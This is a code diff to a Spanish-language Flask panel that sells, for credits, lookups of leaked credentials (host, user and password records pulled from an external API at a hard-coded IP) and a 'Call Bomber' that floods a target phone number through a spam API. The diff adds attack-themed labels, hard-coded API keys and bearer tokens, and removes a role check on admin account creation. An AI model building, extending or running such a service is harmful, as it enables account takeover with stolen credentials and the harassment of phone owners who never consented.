+           <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.223-.548.223l.188-2.85 5.18-4.686c.223-.195-.054-.304-.346-.11l-6.4 4.02-2.76-.86c-.6-.188-.612-.6.126-.89l10.81-4.17c.5-.188.94.116.805.903z"/></svg>
+           CONTACTAR AL DESARROLLADOR
         </a>
     </div>
     """
@@ -650,11 +638,6 @@ def panel_admin():
 
         if action == "crear":
             rol_a_crear = request.form.get("r", "user")
-
-            if r_log == "admin" and not is_super_admin() and rol_a_crear != "user":
-                conn.close()
-                return "Error: admin solo crea clientes", 403
-
             try:
                 nuevo_user = request.form["u"]
                 nuevo_pass = request.form["p"]
@@ -734,7 +717,7 @@ def panel_admin():
 
         elif action == "eliminar_usuario":
             target = request.form.get("target")
-            if target not in ["jhorny", "DRAKITO_VIP7020", "operador1"]:
+            if target not in ["jhorny", "DRAKITO_VIP7020"]:
                 if is_super_admin():
                     cur.execute("DELETE FROM usuarios WHERE user=?", (target,))
                 else:
@@ -755,18 +738,18 @@ def panel_admin():
     if nuevo_creado:
         texto_copiar = f"URL: {nuevo_creado['url']}\\nUSUARIO: {nuevo_creado['user']}\\nCLAVE: {nuevo_creado['pass']}\\nROL: {nuevo_creado['rol']}"
         bloque_nuevo = f'''
-        <div class="bg-[#064e3b]/30 border border-[#10b981]/50 rounded-2xl p-5 mb-6 shadow-[0_0_15px_rgba(16,185,129,0.15)]">
-            <p class="text-[10px] uppercase text-emerald-400 font-bold mb-4 tracking-widest flex items-center gap-2">
-                <span>✅</span> Nuevo acceso generado
+        <div class="bg-emerald-500/10 border border-emerald-500/30 rounded-[24px] p-6 mb-8 shadow-[0_0_20px_rgba(16,185,129,0.1)]">
+            <p class="text-[10px] uppercase text-emerald-400 font-black mb-5 tracking-widest flex items-center gap-2">
+                <span class="text-base">✅</span> Acceso Generado Exitosamente
             </p>
-            <div class="space-y-3 text-xs text-gray-300 font-mono bg-black/40 p-4 rounded-xl">
+            <div class="space-y-3 text-xs text-gray-300 font-mono bg-black/40 p-5 rounded-2xl border border-white/5">
                 <p><span class="text-cyan-500 font-bold">URL:</span> {nuevo_creado["url"]}</p>
-                <p><span class="text-cyan-500 font-bold">USUARIO:</span> {nuevo_creado["user"]}</p>
-                <p><span class="text-cyan-500 font-bold">CLAVE:</span> {nuevo_creado["pass"]}</p>
+                <p><span class="text-cyan-500 font-bold">USER:</span> {nuevo_creado["user"]}</p>
+                <p><span class="text-cyan-500 font-bold">PASS:</span> {nuevo_creado["pass"]}</p>
                 <p><span class="text-cyan-500 font-bold">ROL:</span> {nuevo_creado["rol"]}</p>
             </div>
-            <button onclick="copyText(`{texto_copiar}`)" class="w-full mt-4 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl py-3 text-[10px] uppercase font-bold tracking-widest transition shadow-lg">
-                Copiar acceso
+            <button onclick="copyText(`{texto_copiar}`)" class="w-full mt-5 bg-emerald-500 hover:bg-emerald-400 text-white rounded-xl py-3.5 text-[10px] uppercase font-black tracking-widest transition shadow-lg">
+                Copiar Info
             </button>
         </div>
         '''
@@ -774,70 +757,67 @@ def panel_admin():
 
     lista = ""
     for u in users:
-        if u["rol"] == "operador":
-            continue
-
         btn_eliminar = ""
         if u["user"] not in ["jhorny", "DRAKITO_VIP7020"]:
             btn_eliminar = f"""
-            <form method="POST" onsubmit="return confirm('¿Seguro que deseas eliminar a {u['user']}?');" class="mt-4">
+            <form method="POST" onsubmit="return confirm('¿Seguro que deseas eliminar a {u['user']}?');" class="mt-5">
                 <input type="hidden" name="action" value="eliminar_usuario">
                 <input type="hidden" name="target" value="{u['user']}">
-                <button class="w-full bg-[#7f1d1d]/40 text-red-400 border border-red-500/30 rounded-xl py-2.5 text-[10px] font-bold uppercase tracking-widest hover:bg-[#7f1d1d]/60 transition">
-                    Eliminar Usuario
+                <button class="w-full bg-red-500/10 text-red-400 border border-red-500/20 rounded-xl py-3 text-[10px] font-black uppercase tracking-widest hover:bg-red-500/20 transition-colors">
+                    Remover Cliente
                 </button>
             </form>
             """
 
         lista += f"""
-        <div class="p-5 bg-[#0b111a] rounded-[20px] border border-[#1e293b] mb-4 shadow-sm">
-            <div class="flex justify-between items-center mb-4">
+        <div class="p-6 bg-white/[0.02] rounded-[24px] border border-white/10 mb-4 shadow-sm hover:border-white/20 transition-colors">
+            <div class="flex justify-between items-center mb-5">
                 <div>
-                    <span class="text-white font-bold text-base">{u["user"]}</span>
-                    <span class="text-gray-500 text-[10px] ml-2 uppercase tracking-widest">({u["rol"]})</span>
+                    <span class="text-white font-black text-lg">{u["user"]}</span>
+                    <span class="text-gray-500 text-[10px] ml-2 uppercase tracking-widest font-bold">({u["rol"]})</span>
                 </div>
-                <span class="text-cyan-400 font-black text-lg">{u["creditos"]} Cr.</span>
+                <span class="text-cyan-400 font-black text-xl">{u["creditos"]} <span class="text-sm text-cyan-500/50">Cr.</span></span>
             </div>
 
-            <div class="grid grid-cols-3 gap-2 mb-2">
+            <div class="grid grid-cols-3 gap-3 mb-3">
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="1">
-                    <button class="w-full bg-[#111a26] text-cyan-400 border border-[#1e293b] rounded-xl py-2.5 text-xs font-bold hover:bg-[#1e293b] transition">+1</button>
+                    <button class="w-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl py-3 text-xs font-black hover:bg-cyan-500/20 transition">+1</button>
                 </form>
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="5">
-                    <button class="w-full bg-[#111a26] text-cyan-400 border border-[#1e293b] rounded-xl py-2.5 text-xs font-bold hover:bg-[#1e293b] transition">+5</button>
+                    <button class="w-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl py-3 text-xs font-black hover:bg-cyan-500/20 transition">+5</button>
                 </form>
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="10">
-                    <button class="w-full bg-[#111a26] text-cyan-400 border border-[#1e293b] rounded-xl py-2.5 text-xs font-bold hover:bg-[#1e293b] transition">+10</button>
+                    <button class="w-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl py-3 text-xs font-black hover:bg-cyan-500/20 transition">+10</button>
                 </form>
             </div>
 
-            <div class="grid grid-cols-3 gap-2">
+            <div class="grid grid-cols-3 gap-3">
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="-1">
-                    <button class="w-full bg-[#3f0f15] text-red-400 border border-[#451515] rounded-xl py-2.5 text-xs font-bold hover:bg-[#4f1515] transition">-1</button>
+                    <button class="w-full bg-rose-500/10 text-rose-400 border border-rose-500/20 rounded-xl py-3 text-xs font-black hover:bg-rose-500/20 transition">-1</button>
                 </form>
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="-5">
-                    <button class="w-full bg-[#3f0f15] text-red-400 border border-[#451515] rounded-xl py-2.5 text-xs font-bold hover:bg-[#4f1515] transition">-5</button>
+                    <button class="w-full bg-rose-500/10 text-rose-400 border border-rose-500/20 rounded-xl py-3 text-xs font-black hover:bg-rose-500/20 transition">-5</button>
                 </form>
                 <form method="POST">
                     <input type="hidden" name="action" value="sumar_rapido">
                     <input type="hidden" name="target" value="{u["user"]}">
                     <input type="hidden" name="cant" value="-10">
-                    <button class="w-full bg-[#3f0f15] text-red-400 border border-[#451515] rounded-xl py-2.5 text-xs font-bold hover:bg-[#4f1515] transition">-10</button>
+                    <button class="w-full bg-rose-500/10 text-rose-400 border border-rose-500/20 rounded-xl py-3 text-xs font-black hover:bg-rose-500/20 transition">-10</button>
                 </form>
             </div>
             {btn_eliminar}
@@ -846,44 +826,44 @@ def panel_admin():
 
     content = f"""
     {bloque_nuevo}
-    <div class="neon-card p-6 mt-4 mb-6">
-        <h2 class="text-[13px] text-cyan-400 font-bold uppercase text-center mb-8 tracking-[0.2em]">
-            Panel de Control
+    <div class="neon-card p-8 mt-4 mb-6">
+        <h2 class="text-[12px] text-cyan-400 font-black uppercase text-center mb-8 tracking-[0.3em]">
+            Panel Maestro
         </h2>
 
-        <form method="POST" class="space-y-4 mb-10 border-b border-[#1e293b] pb-8">
+        <form method="POST" class="space-y-4 mb-10 border-b border-white/10 pb-10">
             <input type="hidden" name="action" value="crear">
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1">Crear Usuario</p>
-            <input name="u" placeholder="Usuario Nuevo" class="input-dark" required>
+            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1 mb-2">Crear Nuevo Acceso</p>
+            <input name="u" placeholder="Usuario" class="input-dark" required>
             <input name="p" placeholder="Contraseña" class="input-dark" required>
-            <select name="r" class="input-dark appearance-none">
-                <option value="user">Cliente</option>
-                {"<option value='admin'>Admin Secundario</option>" if is_super_admin() else ""}
+            <select name="r" class="input-dark appearance-none font-medium">
+                <option value="user">Rol: Cliente</option>
+                {"<option value='admin'>Rol: Admin Secundario</option>" if is_super_admin() else ""}
             </select>
-            <button class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 p-4 rounded-xl font-bold text-xs uppercase tracking-widest text-white shadow-lg mt-2">
+            <button class="w-full bg-gradient-to-r from-blue-500 to-cyan-500 p-4 rounded-xl font-black text-[11px] uppercase tracking-[0.2em] text-white shadow-lg mt-4 hover:scale-[1.02] transition-transform">
                 Registrar
             </button>
         </form>
 
-        <form method="POST" class="space-y-4 mb-10 border-b border-[#1e293b] pb-8">
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1">Modificar Saldo</p>
+        <form method="POST" class="space-y-4 mb-10 border-b border-white/10 pb-10">
+            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1 mb-2">Modificar Saldo Manual</p>
             <input name="target" placeholder="Usuario Destino" class="input-dark" required>
-            <input name="cant" type="number" min="1" placeholder="Cantidad" class="input-dark" required>
+            <input name="cant" type="number" min="1" placeholder="Cantidad de Créditos" class="input-dark" required>
 
-            <div class="grid grid-cols-2 gap-3 mt-2">
-                <button type="submit" name="action" value="creditos" class="w-full bg-gradient-to-r from-emerald-500 to-teal-400 p-4 rounded-xl font-bold text-xs uppercase tracking-widest text-white shadow-lg">
-                    Sumar
+            <div class="grid grid-cols-2 gap-4 mt-4">
+                <button type="submit" name="action" value="creditos" class="w-full bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 p-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-lg hover:bg-emerald-500/30 transition">
+                    Inyectar
                 </button>
-                <button type="submit" name="action" value="quitar_creditos" class="w-full bg-gradient-to-r from-rose-500 to-red-600 p-4 rounded-xl font-bold text-xs uppercase tracking-widest text-white shadow-lg">
-                    Quitar
+                <button type="submit" name="action" value="quitar_creditos" class="w-full bg-rose-500/20 border border-rose-500/40 text-rose-400 p-4 rounded-xl font-black text-[10px] uppercase tracking-[0.2em] shadow-lg hover:bg-rose-500/30 transition">
+                    Restar
                 </button>
             </div>
         </form>
 
-        <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1 mb-4">Lista de Usuarios</p>
+        <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1 mb-5">Directorio de Usuarios</p>
 
-        <div class="max-h-[500px] overflow-y-auto pr-1">
-            {lista or "<p class='text-center text-gray-600 text-sm py-8'>Sin usuarios</p>"}
+        <div class="max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+            {lista or "<p class='text-center text-gray-500 text-sm py-8 font-medium'>No hay usuarios registrados</p>"}
         </div>
     </div>
     """
@@ -899,7 +879,6 @@ def intelx():
     if request.method == "POST":
         cliente = session.get("user")
         referencia = request.form.get("dato", "").strip()
-
         costo = 1
 
         conn = get_conn()
@@ -908,8 +887,6 @@ def intelx():
         row = cur.fetchone()
 
         if row and row["creditos"] >= costo:
-            
-            # --- LLAMADA A LA API DE INTELX ---
             api_url = "http://38.250.116.172/api/intelx"
             params = {
                 "auth": "9ntEzxnOMYzpJuIEDJ0Qgh",
@@ -917,63 +894,74 @@ def intelx():
             }
             
             try:
-                r = requests.get(api_url, params=params, timeout=20)
+                # Timeout de 25s por si la API tarda en buscar
+                r = requests.get(api_url, params=params, timeout=25)
+                
                 if r.status_code == 200:
-                    data = r.json()
-                    
-                    if data.get("Status") == "success" and "results" in data:
-                        resultados = data["results"]
-                        total = data.get("total", len(resultados))
+                    try:
+                        data = r.json()
+                        status_api = data.get("Status") or data.get("status")
                         
-                        if len(resultados) > 0:
-                            detalle_ataque = f"🔎 BÚSQUEDA: {referencia}\\n"
-                            detalle_ataque += f"📊 TOTAL ENCONTRADOS: {total}\\n\\n"
+                        if status_api in ["success", "Success", "SUCCESS", True] and "results" in data:
+                            resultados = data["results"]
+                            total = data.get("total", len(resultados))
                             
-                            limite = 150
-                            for res in resultados[:limite]:
-                                detalle_ataque += f"🌐 HOST: {res.get('host', 'N/A')}\\n"
-                                detalle_ataque += f"👤 USER: {res.get('usuario', 'N/A')}\\n"
-                                detalle_ataque += f"🔑 PASS: {res.get('password', 'N/A')}\\n"
-                                detalle_ataque += "--------------------------\\n"
+                            if len(resultados) > 0:
+                                detalle_ataque = f"🔎 RASTREO: {referencia}\\n"
+                                detalle_ataque += f"📊 DATA OBTENIDA: {total} registros\\n\\n"
                                 
-                            if len(resultados) > limite:
-                                detalle_ataque += f"\\n... [Se muestran los primeros {limite} resultados de {total} encontrados]"
+                                limite = 150
+                                for res in resultados[:limite]:
+                                    detalle_ataque += f"🌐 HOST: {res.get('host', 'N/A')}\\n"
+                                    detalle_ataque += f"👤 USER: {res.get('usuario', 'N/A')}\\n"
+                                    detalle_ataque += f"🔑 PASS: {res.get('password', 'N/A')}\\n"
+                                    detalle_ataque += "--------------------------\\n"
+                                    
+                                if len(resultados) > limite:
+                                    detalle_ataque += f"\\n... [Mostrando primeros {limite} resultados de {total}]"
 
-                            cur.execute("UPDATE usuarios SET creditos = creditos - ? WHERE user=?", (costo, cliente))
-                            cur.execute("""
-                                INSERT INTO pedidos (cliente, referencia, estado, tipo, respuesta, detalle, codigo, operador)
-                                VALUES (?, ?, 'EXITOSO', 'intelx', 'DATOS ENCONTRADOS', ?, '', 'SISTEMA_API')
-                            """, (cliente, referencia, detalle_ataque))
-                            conn.commit()
-                            
-                            msg = f"<p class='text-emerald-400 text-xs text-center font-bold mb-4 bg-emerald-900/30 p-3 rounded-xl uppercase tracking-widest'>¡Datos encontrados! ({total} resultados)</p>"
+                                cur.execute("UPDATE usuarios SET creditos = creditos - ? WHERE user=?", (costo, cliente))
+                                cur.execute("""
+                                    INSERT INTO pedidos (cliente, referencia, estado, tipo, respuesta, detalle, codigo, operador)
+                                    VALUES (?, ?, 'EXITOSO', 'intelx', 'TARGET LOCALIZADO', ?, '', 'SISTEMA_API')
+                                """, (cliente, referencia, detalle_ataque))
+                                conn.commit()
+                                
+                                msg = f"<p class='text-emerald-400 text-[11px] text-center font-black mb-6 bg-emerald-500/10 border border-emerald-500/30 p-4 rounded-2xl uppercase tracking-widest'>¡Datos Extraídos! ({total})</p>"
+                            else:
+                                msg = "<p class='text-yellow-400 text-[11px] text-center font-black mb-6 bg-yellow-500/10 border border-yellow-500/30 p-4 rounded-2xl uppercase tracking-widest'>Sin registros en la DB IntelX.</p>"
                         else:
-                            msg = "<p class='text-yellow-400 text-xs text-center font-bold mb-4 bg-yellow-900/30 p-3 rounded-xl uppercase tracking-widest'>No se encontró información para este dato.</p>"
-                    else:
-                        msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>Error en la respuesta del servidor IntelX.</p>"
+                            msg = f"<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Fallo de API: Estructura desconocida.</p>"
+                    except json.JSONDecodeError:
+                        msg = "<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Fallo crítico: La API no devolvió un JSON válido.</p>"
                 else:
-                    msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>API de IntelX caída o sin respuesta.</p>"
+                    msg = f"<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>API Error HTTP {r.status_code}. El servidor rechazó la conexión.</p>"
                     
+            except requests.exceptions.Timeout:
+                msg = "<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Timeout: La API de IntelX tardó demasiado en responder (>25s).</p>"
+            except requests.exceptions.ConnectionError:
+                msg = "<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Error: Conexión rechazada o caída en el servidor IntelX.</p>"
             except Exception as e:
-                msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>Error de conexión con la API de IntelX.</p>"
+                msg = f"<p class='text-rose-400 text-[10px] text-center font-bold mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl'>Error interno: {str(e)[:50]}</p>"
                 
         else:
-            msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>Saldo insuficiente</p>"
+            msg = "<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Créditos Insuficientes</p>"
 
         conn.close()
 
     content = f"""
-    <div class="neon-card p-6 mt-10 text-center">
-        <h2 class="text-[13px] text-cyan-400 font-bold mb-8 uppercase tracking-[0.2em]">Búsqueda IntelX</h2>
+    <div class="neon-card p-8 mt-10 text-center">
+        <h2 class="text-[13px] text-cyan-400 font-black mb-8 uppercase tracking-[0.3em]">Módulo IntelX</h2>
         {msg}
-        <form action="/intelx" method="POST" class="space-y-5">
-            <div class="bg-[#111a26] p-5 rounded-2xl border border-[#1e293b]">
-                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest mb-3 text-left">Dato a rastrear</p>
-                <input type="text" name="dato" placeholder="Dominios (ej: google.com), Correos, DNI..." maxlength="60"
-                       class="bg-transparent w-full text-center text-lg font-mono text-white outline-none placeholder-gray-600" required>
+        <form action="/intelx" method="POST" class="space-y-6">
+            <div class="bg-white/[0.02] p-6 rounded-[24px] border border-white/10 relative overflow-hidden">
+                <div class="absolute inset-0 bg-gradient-to-b from-cyan-500/5 to-transparent"></div>
+                <p class="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-4 text-left relative z-10">Target a escanear</p>
+                <input type="text" name="dato" placeholder="Dominios (ej: google.com), Correos..." maxlength="60"
+                       class="relative z-10 bg-black/40 w-full text-center text-lg font-mono font-bold text-white outline-none placeholder-gray-600 border border-white/10 rounded-xl py-4 focus:border-cyan-500/50 transition-colors" required>
             </div>
-            <button class="w-full bg-[#06b6d4] p-4 rounded-xl font-bold text-xs uppercase tracking-widest text-white shadow-[0_0_15px_rgba(6,182,212,0.4)] mt-2 hover:bg-[#0891b2] transition">
-                Rastrear Dato (1 Cr.)
+            <button class="w-full bg-gradient-to-r from-cyan-500 to-blue-500 p-4 rounded-xl font-black text-xs uppercase tracking-[0.2em] text-white shadow-[0_10px_20px_rgba(14,165,233,0.3)] hover:scale-[1.02] transition-transform">
+                EJECUTAR EXTRACCIÓN (1 Cr.)
             </button>
         </form>
     </div>
@@ -1004,17 +992,9 @@ def llamadas_spam():
 
         if row and row["creditos"] >= costo:
             
-            # --- LLAMADA A LA API DE SUPABASE ---
             api_url = "https://gdnnmmlwnhbyngvshxms.supabase.co/functions/v1/spam-api"
-            payload = {
-                "phone": numero,
-                "level": nivel,
-                "clave": "angelkbro"
-            }
-            headers = {
-                "Authorization": "Bearer angelkbro",
-                "Content-Type": "application/json"
-            }
+            payload = {"phone": numero, "level": nivel, "clave": "angelkbro"}
+            headers = {"Authorization": "Bearer angelkbro", "Content-Type": "application/json"}
             
             try:
                 r = requests.post(api_url, json=payload, headers=headers, timeout=15)
@@ -1022,249 +1002,51 @@ def llamadas_spam():
                 if r.status_code in [200, 201]:
                     cur.execute("UPDATE usuarios SET creditos = creditos - ? WHERE user=?", (costo, cliente))
                     
-                    detalle_ataque = f"🎯 NÚMERO: {numero}\\n🔥 NIVEL: {nivel}\\n✅ ESTADO: Ejecutado automáticamente por API."
+                    detalle_ataque = f"🎯 TARGET: {numero}\\n🔥 POTENCIA: Nivel {nivel}\\n✅ ESTADO: Bombardeo iniciado."
                     
                     cur.execute("""
                         INSERT INTO pedidos (cliente, referencia, estado, tipo, respuesta, detalle, codigo, operador)
-                        VALUES (?, ?, 'EXITOSO', 'llamadas_spam', 'ATAQUE ENVIADO', ?, '', 'SISTEMA_API')
+                        VALUES (?, ?, 'EXITOSO', 'llamadas_spam', 'SISTEMA ACTIVO', ?, '', 'SISTEMA_API')
                     """, (cliente, numero, detalle_ataque))
                     
                     conn.commit()
-                    msg = f"<p class='text-emerald-400 text-xs text-center font-bold mb-4 bg-emerald-900/30 p-3 rounded-xl uppercase tracking-widest'>¡Ataque Nivel {nivel} enviado al {numero}!</p>"
+                    msg = f"<p class='text-emerald-400 text-[11px] text-center font-black mb-6 bg-emerald-500/10 border border-emerald-500/30 p-4 rounded-2xl uppercase tracking-widest'>¡Bombardeo Nivel {nivel} en curso hacia el {numero}!</p>"
                 else:
-                    msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>Error en la API. No se cobraron créditos.</p>"
+                    msg = f"<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Error en la API. HTTP {r.status_code}.</p>"
             except Exception as e:
-                msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>La API no responde. Intenta más tarde.</p>"
+                msg = f"<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Error de conexión: La API Spam no responde.</p>"
                 
         else:
-            msg = "<p class='text-red-400 text-xs text-center font-bold mb-4 bg-red-900/30 p-3 rounded-xl uppercase tracking-widest'>Saldo insuficiente</p>"
+            msg = "<p class='text-rose-400 text-[11px] text-center font-black mb-6 bg-rose-500/10 border border-rose-500/30 p-4 rounded-2xl uppercase tracking-widest'>Créditos Insuficientes</p>"
 
         conn.close()
 
     content = f"""
-    <div class="neon-card p-6 mt-10">
-        <h2 class="text-[13px] text-cyan-400 font-bold mb-8 uppercase text-center tracking-[0.2em]">Spam de Llamadas</h2>
+    <div class="neon-card p-8 mt-10">
+        <h2 class="text-[13px] text-red-400 font-black mb-8 uppercase text-center tracking-[0.3em]">Call Bomber</h2>
         {msg}
-        <form action="/llamadas_spam" method="POST" class="space-y-5">
-            <div class="bg-[#111a26] p-5 rounded-2xl border border-[#1e293b]">
-                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest mb-3 text-left">Número Objetivo</p>
-                <input type="text" name="numero" placeholder="Ejem: 999888777" class="bg-transparent w-full text-center text-xl font-mono text-white outline-none placeholder-gray-600 mb-6" required>
+        <form action="/llamadas_spam" method="POST" class="space-y-6">
+            <div class="bg-white/[0.02] p-6 rounded-[24px] border border-white/10 relative overflow-hidden">
+                <div class="absolute inset-0 bg-gradient-to-b from-red-500/5 to-transparent"></div>
                 
-                <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest mb-3 text-left border-t border-[#1e293b] pt-4">Nivel de Ataque</p>
-                <select name="level" class="input-dark appearance-none text-center font-bold text-cyan-400 cursor-pointer" required>
-                    <option value="1">Nivel 1 (Básico)</option>
-                    <option value="2">Nivel 2 (Intermedio)</option>
-                    <option value="3">Nivel 3 (Extremo)</option>
+                <p class="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-3 text-left relative z-10">Número Objetivo</p>
+                <input type="text" name="numero" placeholder="Ejem: 999888777" class="relative z-10 bg-black/40 w-full text-center text-xl font-mono font-bold text-white outline-none placeholder-gray-600 border border-white/10 rounded-xl py-4 mb-6 focus:border-red-500/50 transition-colors" required>
+                
+                <p class="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-3 text-left border-t border-white/10 pt-5 relative z-10">Potencia de Ataque</p>
+                <select name="level" class="relative z-10 input-dark appearance-none text-center font-bold text-red-400 cursor-pointer !bg-black/40 !border-white/10 focus:!border-red-500/50" required>
+                    <option value="1">Nivel 1 (Aviso)</option>
+                    <option value="2">Nivel 2 (Molestia Constante)</option>
+                    <option value="3">Nivel 3 (Saturación Total)</option>
                 </select>
             </div>
             
-            <button class="w-full bg-[#ef4444] p-4 rounded-xl font-bold text-xs uppercase tracking-widest text-white shadow-[0_0_15px_rgba(239,68,68,0.4)] mt-4 hover:bg-[#dc2626] transition">
-                Iniciar Ataque (2 Cr.)
+            <button class="w-full bg-gradient-to-r from-red-600 to-rose-500 p-4 rounded-xl font-black text-xs uppercase tracking-[0.2em] text-white shadow-[0_10px_20px_rgba(225,29,72,0.3)] mt-4 hover:scale-[1.02] transition-transform">
+                INICIAR BOMBARDEO (2 Cr.)
             </button>
         </form>
     </div>
     """
     return layout(content, True)
-
-
-@app.route("/gestion")
-def gestion():
-    if not require_login() or session.get("rol") != "operador":
-        return redirect("/")
-
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("""
-        SELECT id_pedido, cliente, referencia, tipo, estado
-        FROM pedidos
-        WHERE estado='PENDIENTE'
-        ORDER BY id_pedido DESC
-    """)
-    ps = cur.fetchall()
-    conn.close()
-
-    cards = "".join([
-        f"""
-        <div class="bg-[#111a26] p-5 rounded-[20px] border border-[#1e293b] mb-4 shadow-sm">
-            <div class="flex justify-between items-start mb-4">
-                <div class="space-y-1">
-                    <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest">CLIENTE: <span class="text-white">{p["cliente"]}</span></p>
-                    <p class="text-[9px] text-cyan-500 font-bold uppercase tracking-widest">TIPO: {(p["tipo"] or "").upper()}</p>
-                </div>
-                <span class="bg-[#1e293b] text-gray-300 text-[10px] px-3 py-1 rounded-full font-mono">ID: {p["id_pedido"]}</span>
-            </div>
-
-            <div class="bg-black/30 p-3 rounded-xl border border-[#1e293b] mb-4">
-                <p class="text-sm font-mono text-white text-center">{p["referencia"] or "SIN DATO"}</p>
-            </div>
-
-            <a href="/trabajar/{p["id_pedido"]}" class="block text-center w-full bg-gradient-to-r from-blue-500 to-cyan-500 text-white px-4 py-3 rounded-xl text-xs font-bold uppercase tracking-widest shadow-lg hover:opacity-90 transition">
-                AGARRAR PEDIDO
-            </a>
-        </div>
-        """
-        for p in ps
-    ])
-
-    return layout(
-        f"""
-        <div class="mt-6 mb-8 text-center">
-            <h2 class="text-[13px] text-yellow-500 font-black uppercase tracking-[0.2em]">Bandeja Operador</h2>
-        </div>
-        <div class="space-y-2">
-            {cards or '<p class="text-center text-gray-600 text-sm py-10">No hay pedidos manuales pendientes.</p>'}
-        </div>
-        """,
-        True
-    )
-
-
-@app.route("/trabajar/<int:id_p>")
-def trabajar(id_p):
-    if not require_login() or session.get("rol") != "operador":
-        return redirect("/")
-
-    conn = get_conn()
-    cur = conn.cursor()
-    cur.execute("""
-        SELECT id_pedido, cliente, referencia, tipo
-        FROM pedidos
-        WHERE id_pedido=?
-    """, (id_p,))
-    p = cur.fetchone()
-    conn.close()
-
-    if not p:
-        return redirect("/gestion")
-
-    tipo = (p["tipo"] or "").lower()
-
-    if tipo == "intelx":
-        form_html = f"""
-        <form action="/completar" method="POST" class="space-y-4">
-            <input type="hidden" name="id_p" value="{p["id_pedido"]}">
-            <input type="hidden" name="tipo_form" value="intelx">
-
-            <p class="text-[10px] text-gray-400 uppercase font-bold tracking-widest ml-1">Pega aquí los datos obtenidos:</p>
-            <textarea name="datos_obtenidos" placeholder="Nombres, DNI, Correos, Direcciones, etc..."
-                class="input-dark h-64 resize-none text-sm leading-relaxed" required></textarea>
-
-            <div class="grid grid-cols-2 gap-4 mt-6">
-                <button type="submit" name="accion" value="exito" class="w-full bg-emerald-500 hover:bg-emerald-600 text-white rounded-xl py-4 text-xs font-bold uppercase tracking-widest shadow-[0_0_15px_rgba(16,185,129,0.3)] transition">
-                    ENVIAR INFO
-                </button>
-                <button type="submit" name="accion" value="rechazar" class="w-full bg-rose-500 hover:bg-rose-600 text-white rounded-xl py-4 text-xs font-bold uppercase tracking-widest shadow-[0_0_15px_rgba(244,63,94,0.3)] transition">
-                    SIN RESULTADO
-                </button>
-            </div>
-        </form>
-        """
-    else: 
-        form_html = f"""
-        <form action="/completar" method="POST" class="space-y-4">
-            <input type="hidden" name="id_p" value="{p["id_pedido"]}">
-            <input type="hidden" name="tipo_form" value="llamadas_spam">
-
